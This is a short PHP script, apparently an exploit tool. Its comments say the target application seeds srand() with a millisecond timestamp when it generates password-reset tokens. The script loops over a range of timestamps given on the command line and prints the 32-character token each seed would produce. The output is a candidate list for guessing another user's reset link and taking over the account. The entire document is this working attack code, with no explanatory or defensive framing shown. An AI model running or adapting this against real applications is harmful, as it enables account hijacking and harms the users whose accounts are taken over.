<?php
// Reproduces the app's password-reset token for a given seed (millisecond timestamp).
// The app seeds srand() with round(microtime(true)*1000), so each candidate ms = one seed.
function generateToken($seed)
{
    srand($seed);
    $chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_';
    $ret = '';
    for ($i = 0; $i < 32; $i++) {
        $ret .= $chars[rand(0, strlen($chars) - 1)];
    }
    return $ret;
}

$ts_lower = (int)$argv[1];
$ts_upper = (int)$argv[2];

for ($ts = $ts_lower; $ts <= $ts_upper; $ts++) {
    print(generateToken($ts) . "\n");
}
